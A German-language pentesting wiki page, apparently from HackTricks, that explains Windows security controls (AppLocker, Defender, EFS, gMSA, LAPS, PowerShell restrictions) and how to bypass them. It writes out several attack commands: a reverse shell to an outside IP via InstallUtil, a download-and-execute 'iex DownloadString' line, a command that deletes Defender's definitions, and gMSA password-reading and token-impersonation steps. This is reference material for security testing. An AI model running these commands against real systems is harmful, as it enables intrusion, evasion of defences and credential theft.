# Windows-Sicherheitskontrollen

{{#include ../banners/hacktricks-training.md}}

## AppLocker-Richtlinie

Eine Anwendungs-Whitelist ist eine Liste zugelassener Softwareanwendungen oder ausführbarer Dateien, die auf einem System vorhanden sein und ausgeführt werden dürfen. Ziel ist es, die Umgebung vor schädlicher Malware und nicht genehmigter Software zu schützen, die nicht den spezifischen geschäftlichen Anforderungen einer Organisation entspricht.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ist Microsofts **Lösung für Anwendungs-Whitelisting** und gibt Systemadministratoren die Kontrolle darüber, **welche Anwendungen und Dateien Benutzer ausführen können**. Sie bietet **granulare Kontrolle** über ausführbare Dateien, Skripte, Windows-Installer-Dateien, DLLs, Paket-Apps und Installer für Paket-Apps.\
Organisationen **blockieren häufig cmd.exe und PowerShell.exe** und den Schreibzugriff auf bestimmte Verzeichnisse, **doch all das lässt sich umgehen**.

### Prüfen

Prüfe, welche Dateien/Erweiterungen auf der Blacklist/Whitelist stehen:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy` wertet Kandidatendateien für eine bestimmte Identität anhand einer AppLocker-Richtlinie aus. Prüfe das Konto, dessen Token die Payload ausführt, da Regeln auf Benutzer oder Gruppen abzielen können; `Get-AppLockerFileInformation` ist ebenfalls nützlich, um Pfad, Hash und Publisher-Metadaten zu untersuchen, anhand derer Regeln greifen können.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

Bevor Sie ein verweigertes Testergebnis als wirksame Blockierung einstufen, prüfen Sie den **effektiven Erzwingungsmodus dieser Regelsammlung** und den Dienst „Application Identity“. `AuditOnly` wertet Regeln aus, erlaubt die Ausführung aber weiterhin. `NotConfigured` ist nicht gleichbedeutend mit deaktiviert, wenn die Sammlung Regeln enthält.<sup>[[7]](#references)</sup> Ein angehaltener `AppIDSvc` verhindert die AppLocker-Erzwingung.<sup>[[9]](#references)</sup> Mit diesen Prüfungen lässt sich eine tatsächliche Umgehung von einer Richtlinie unterscheiden, die die Datei nie blockiert hat.

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

For einen kontrollierten Ausführungstest sollten Sie das AppLocker-Ereignisprotokoll prüfen: **8003/8006** bedeuten, dass die EXE/DLL oder das Skript/MSI im Überwachungsmodus blockiert worden wäre; **8004/8007** bedeuten, dass sie tatsächlich blockiert wurde. Testen Sie denselben Dateityp und dieselbe Identität wie beim vorgesehenen Ausführungspfad.<sup>[[8]](#references)</sup>

Dieser Registrierungspfad enthält die von AppLocker angewendeten Konfigurationen und Richtlinien und ermöglicht es, die aktuell auf dem System durchgesetzten Regeln zu überprüfen:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nützliche **beschreibbare Ordner**, um die AppLocker-Richtlinie zu umgehen: Wenn AppLocker die Ausführung beliebiger Dateien in `C:\Windows\System32` oder `C:\Windows` zulässt, gibt es **beschreibbare Ordner**, die Sie zum **Umgehen der Richtlinie** verwenden können.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Häufig können **vertrauenswürdige** [**"LOLBAS's"**](https://lolbas-project.github.io/) Binärdateien ebenfalls nützlich sein, um AppLocker zu umgehen.
- **Schlecht geschriebene Regeln lassen sich ebenfalls umgehen**
  - Zum Beispiel kannst du bei **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** **überall einen Ordner namens `allowed` erstellen**, und er wird zugelassen.
  - Unternehmen konzentrieren sich außerdem oft darauf, die ausführbare Datei **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** zu **blockieren**, vergessen aber die **anderen** [**Speicherorte der PowerShell-Ausführdateien**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) wie `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` oder `PowerShell_ISE.exe`.
- **DLL enforcement ist nur sehr selten aktiviert**, da es ein System zusätzlich belasten kann und umfangreiche Tests erforderlich sind, um sicherzustellen, dass nichts beschädigt wird. Daher können **DLLs als Backdoors dabei helfen, AppLocker zu umgehen**.
- Mit [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kannst du **Powershell**-Code in jedem Prozess **ausführen** und AppLocker umgehen. Weitere Informationen findest du hier: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Speicherung von Anmeldedaten

### Security Accounts Manager (SAM)

Lokale Anmeldedaten befinden sich in dieser Datei; die Passwörter sind gehasht.

### Local Security Authority (LSA) - LSASS

Die **Anmeldedaten** (gehasht) werden aus Gründen des Single Sign-On im **Speicher** dieses Subsystems **gespeichert**.\
**LSA** verwaltet die lokale **Sicherheitsrichtlinie** (Passwortrichtlinie, Benutzerberechtigungen ...), die **Authentifizierung**, **Zugriffstoken** ...\
LSA **überprüft** die bereitgestellten Anmeldedaten in der **SAM**-Datei (bei einer lokalen Anmeldung) und **kommuniziert** mit dem **Domänencontroller**, um einen Domänenbenutzer zu authentifizieren.

Die **Anmeldedaten** werden im **LSASS-Prozess gespeichert**: Kerberos-Tickets, NT- und LM-Hashes, leicht entschlüsselbare Passwörter.

### LSA secrets

LSA kann einige Anmeldedaten auf dem Datenträger speichern:

- Passwort des Computerkontos in Active Directory (nicht erreichbarer Domänencontroller).
- Passwörter der Konten von Windows-Diensten
- Passwörter für geplante Aufgaben
- Weitere (Passwort von IIS-Anwendungen ...)

### NTDS.dit

Dies ist die Datenbank von Active Directory. Sie ist nur auf Domänencontrollern vorhanden.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ist ein Antivirusprogramm, das in Windows 10 und Windows 11 sowie in Versionen von Windows Server verfügbar ist. Es **blockiert** gängige Pentesting-Tools wie **`WinPEAS`**. Es gibt jedoch Möglichkeiten, **diese Schutzmaßnahmen zu umgehen**.

### Überprüfung

Um den **Status** von **Defender** zu überprüfen, kannst du das PS-Cmdlet **`Get-MpComputerStatus`** ausführen (prüfe den Wert von **`RealTimeProtectionEnabled`**, um festzustellen, ob der Schutz aktiv ist):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Zur Enumeration kannst du auch Folgendes ausführen:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Verschlüsseltes Dateisystem (EFS)

EFS schützt Dateien durch Verschlüsselung mit einem **symmetrischen Schlüssel**, dem **File Encryption Key (FEK)**. Dieser Schlüssel wird mit dem **öffentlichen Schlüssel** des Benutzers verschlüsselt und in den NTFS-Metadaten der Datei (`$EFS`), genauer im `$LOGGED_UTILITY_STREAM`, gespeichert, **nicht** in einem gewöhnlichen alternativen `$DATA`-Datenstrom.<sup>[[10]](#references)</sup> Zur Entschlüsselung wird der FEK mit dem entsprechenden **privaten Schlüssel** des digitalen Zertifikats des Benutzers entschlüsselt. Ein konfigurierter Datenwiederherstellungs-Agent (DRA) besitzt eine separate verschlüsselte Kopie des FEK im Data Recovery Field.<sup>[[13]](#references)</sup>

**Entschlüsselungsszenarien ohne Zutun des Benutzers** sind unter anderem:

- Wenn Dateien oder Ordner auf ein Dateisystem ohne EFS, etwa [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), verschoben werden, werden sie automatisch entschlüsselt.
- Über das Netzwerk per SMB/CIFS-Protokoll gesendete verschlüsselte Dateien werden vor der Übertragung entschlüsselt.

Diese Verschlüsselungsmethode ermöglicht dem Besitzer **transparenten Zugriff** auf verschlüsselte Dateien. Das bloße Ändern des Kennworts des Besitzers und anschließende Anmelden ermöglicht jedoch keine Entschlüsselung.

**Wichtige Erkenntnisse**:

- EFS verwendet einen symmetrischen FEK, der mit dem öffentlichen Schlüssel des Benutzers verschlüsselt wird.
- Für die Entschlüsselung wird der private Schlüssel des Benutzers verwendet, um auf den FEK zuzugreifen.
- Unter bestimmten Bedingungen, etwa beim Kopieren auf FAT32 oder bei der Netzwerkübertragung, erfolgt eine automatische Entschlüsselung.
- Der Besitzer kann ohne zusätzliche Schritte auf verschlüsselte Dateien zugreifen.

### EFS-Informationen prüfen

Leite die Verwendung von EFS nicht aus `%APPDATA%\Microsoft\Protect` ab: Dort werden DPAPI-Masterschlüssel für viele Windows-Funktionen gespeichert.<sup>[[19]](#references)</sup> Prüfe stattdessen eine verschlüsselte Datei mit `cipher /c "C:\path\file"`, um die Benutzer- und Wiederherstellungszertifikate aufzulisten. `cipher /e` und `cipher /d` verschlüsseln beziehungsweise entschlüsseln Dateien für einen Sicherheitsprinzipal, der über den passenden privaten Schlüssel verfügt.<sup>[[11]](#references)</sup>

### EFS-Dateien entschlüsseln

Wenn `cipher /c` ein Wiederherstellungszertifikat auflistet und du dessen **zugehörigen privaten DRA-Schlüssel** in einer PFX-Datei besitzt, importiere diese PFX-Datei in den Zertifikatsspeicher des aktuellen Benutzers und entschlüssle anschließend die Datei.<sup>[[11]](#references)[[12]](#references)</sup> Ein neu generiertes DRA-Zertifikat kann ältere Dateien nicht entschlüsseln: Sein öffentlicher Schlüssel muss bereits beim Verschlüsseln der Datei eingebunden worden sein. Der Zugriff über NTFS-ACLs oder das Zurücksetzen des Kontokennworts allein stellt den erforderlichen privaten Schlüssel nicht bereit.<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### Als SYSTEM auftreten

Bei diesem Ansatz muss der **Opferbenutzer** auf dem Host einen **Prozess** **ausführen**. In diesem Fall kannst du in einer `meterpreter`-Sitzung das Prozesstoken des Benutzers imitieren (`impersonate_token` aus `incognito`). Alternativ kannst du mit `migrate` in den Prozess des Benutzers wechseln.

#### Das Passwort des Benutzers kennen

Mimikatz kann das Zertifikat und den privaten Schlüssel des Benutzers importieren und damit EFS-geschützte Dateien entschlüsseln.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft entwickelte **Group Managed Service Accounts (gMSA)**, um die Verwaltung von Dienstkonten in IT-Infrastrukturen zu vereinfachen. Im Gegensatz zu herkömmlichen Dienstkonten, bei denen häufig die Einstellung "**Password never expire**" aktiviert ist, bieten gMSAs eine sicherere und leichter verwaltbare Lösung:

- **Automatische Passwortverwaltung**: gMSAs verwenden ein komplexes Passwort mit 240 Byte, das normalerweise alle 30 Tage geändert wird. Domänencontroller leiten es mithilfe von KDS-Schlüsselmaterial ab, wodurch manuelle Passwortaktualisierungen entfallen.<sup>[[16]](#references)[[20]](#references)</sup>
- **Erhöhte Sicherheit**: Diese Konten können nicht gesperrt werden und sind nicht für interaktive Anmeldungen verwendbar, was ihre Sicherheit erhöht.
- **Unterstützung mehrerer Hosts**: gMSAs können von mehreren Hosts gemeinsam genutzt werden und eignen sich daher ideal für Dienste, die auf mehreren Servern ausgeführt werden.
- **Unterstützung geplanter Aufgaben**: Im Gegensatz zu verwalteten Dienstkonten können gMSAs für geplante Aufgaben verwendet werden.
- **Vereinfachte SPN-Verwaltung**: Das System aktualisiert den Service Principal Name (SPN) automatisch, wenn sich die sAMaccount-Details oder der DNS-Name des Computers ändern, wodurch die SPN-Verwaltung vereinfacht wird.

Ein Domänencontroller erstellt das LDAP-Attribut _**msDS-ManagedPassword**_ beim Lesen aus KDS-abgeleitetem Passwortmaterial; der Wert ist kein unabhängig gespeichertes Passwort. Er ändert sich normalerweise alle 30 Tage.<sup>[[20]](#references)</sup> Der zurückgegebene [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) ist **kein verschlüsseltes Passwort**: Sein Feld `CurrentPassword` enthält das Klartextpasswort.<sup>[[14]](#references)</sup> Der Zugriff wird anhand von `msDS-GroupMSAMembership` geprüft. Daher fallen alle Principals mit Abrufberechtigungen in den Geltungsbereich, nicht nur Administratoren oder die Diensthosts.<sup>[[15]](#references)</sup> Die LDAP-Verbindung muss Vertraulichkeit gewährleisten, etwa durch LDAPS oder SASL-Sealing.<sup>[[20]](#references)</sup>

Informationen zur Offline-Passwortableitung nach einer Offenlegung des KDS-Root-Keys findest du unter [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md).

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Du kannst dieses Passwort mit [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)** auslesen:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Weitere Informationen in diesem Beitrag**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Siehe auch diese [Webseite](https://cube0x0.github.io/Relaying-for-gMSA/), auf der erklärt wird, wie man einen **NTLM relay attack** durchführt, um das **Passwort** von **gMSA** **auszulesen**.<sup>[[3]](#references)</sup>

## LAPS

Unterscheide bei der Enumeration zwischen **legacy Microsoft LAPS** und der nativen Implementierung **Windows LAPS**. Windows LAPS wurde mit den Windows-Updates vom 11. April 2023 veröffentlicht und kann ein verwaltetes lokales Administratorpasswort in **Windows Server Active Directory** oder **Microsoft Entra ID** sichern. In AD-gestützten Bereitstellungen kann es Passwörter außerdem verschlüsseln, einen Verlauf verschlüsselter Passwörter aufbewahren und das DSRM-Passwort eines Domain Controllers verwalten. Das herunterladbare Legacy-MSI ist in neueren Windows-Versionen veraltet, Windows LAPS kann jedoch im Legacy-Emulationsmodus betrieben werden.<sup>[[6]](#references)</sup>

Da legacy Microsoft LAPS und Windows LAPS separate Implementierungen sind, solltest du vor dem Anwenden von Attribut- oder Cmdlet-spezifischen Angriffen ermitteln, welche davon bereitgestellt ist. Die verlinkte Seite behandelt Discovery, ACL-Enumeration, Abruf, Manipulation des Ablaufs und Offline-Wiederherstellung, ohne diese Verfahren hier zu wiederholen.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **schränkt viele der Funktionen ein**, die für eine effektive Nutzung von PowerShell benötigt werden, etwa durch das Blockieren von COM-Objekten, die Beschränkung auf zugelassene .NET-Typen, XAML-basierte Workflows, PowerShell-Klassen und mehr.

### **Überprüfen**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

`powershell.exe -Version 2` war ein veralteter Downgrade, der nur auf Hosts mit installierter optionaler PowerShell-2-Engine möglich war. In aktualisierten Versionen von Windows 11 24H2 und Windows Server 2025 ist sie nicht mehr enthalten; betrachte sie nicht als aktuellen CLM-Bypass.<sup>[[17]](#references)</sup> Bei Anwendungskontrolle führt PowerShell nicht vertrauenswürdigen Code in Constrained Language aus, während richtlinienvertrauenswürdige Skripts in Full Language ausgeführt werden können.<sup>[[18]](#references)</sup>

Für ältere Konfigurationen kannst du [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) verwenden.\
**Zum Kompilieren musst du möglicherweise** **einen** _**Verweis hinzufügen**_ -> _Durchsuchen_ ->_Durchsuchen_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` hinzufügen und **das Projekt auf .Net4.5 ändern**.

#### Direct bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Du kannst [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell**-Code in einem beliebigen Prozess **auszuführen** und den eingeschränkten Modus zu umgehen. Weitere Informationen findest du hier: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS-Ausführungsrichtlinie

Standardmäßig ist sie auf **restricted** gesetzt. Die wichtigsten Möglichkeiten, diese Richtlinie zu umgehen:<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Weitere Informationen finden Sie [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Ist die API, die zur Authentifizierung von Benutzern verwendet werden kann.

SSPI ist dafür zuständig, das geeignete Protokoll für zwei Maschinen zu finden, die miteinander kommunizieren möchten. Die bevorzugte Methode hierfür ist Kerberos. Anschließend handelt SSPI aus, welches Authentifizierungsprotokoll verwendet wird. Diese Authentifizierungsprotokolle werden Security Support Provider (SSP) genannt. Sie befinden sich auf jeder Windows-Maschine in Form einer DLL, und beide Maschinen müssen dasselbe Protokoll unterstützen, damit sie kommunizieren können.

### Main SSPs

- **Kerberos**: Das bevorzugte Protokoll
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** und **NTLMv2**: Aus Kompatibilitätsgründen
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webserver und LDAP, Passwort in Form eines MD5-Hashs
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL und TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Wird verwendet, um das zu verwendende Protokoll auszuhandeln (Kerberos oder NTLM, wobei Kerberos standardmäßig verwendet wird)
  - %windir%\Windows\System32\lsasrv.dll

#### Bei der Aushandlung können mehrere Methoden oder nur eine angeboten werden.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsaufforderung für Aktivitäten mit erhöhten Berechtigungen** ermöglicht.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [AppLocker und den eingeschränkten PowerShell-Sprachmodus umgehen](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [Anleitung ~ EFS-Dateien entschlüsseln](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying für gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 Möglichkeiten, die PowerShell Execution Policy zu umgehen](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Die AppLocker-Windows-PowerShell-Cmdlets verwenden](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Überblick über Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [Mit AppLocker-Regeln arbeiten](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [Die Ereignisanzeige mit AppLocker verwenden](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [AppLocker-Prozesse und -Interaktionen](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [Dateistreams (lokale Dateisysteme)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Cipher-Befehl](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Certutil-Befehl](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Den privaten EFS-Schlüssel des Wiederherstellungs-Agents sichern](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [Attribut ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [Gruppenverwaltete Dienstkonten absichern](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Aus dem Windows-Client entfernte Funktionen](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [PowerShell mit App Control absichern](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [Ereignis 4693 und DPAPI-Masterschlüssel](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [Konstruktion von msDS-ManagedPassword](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
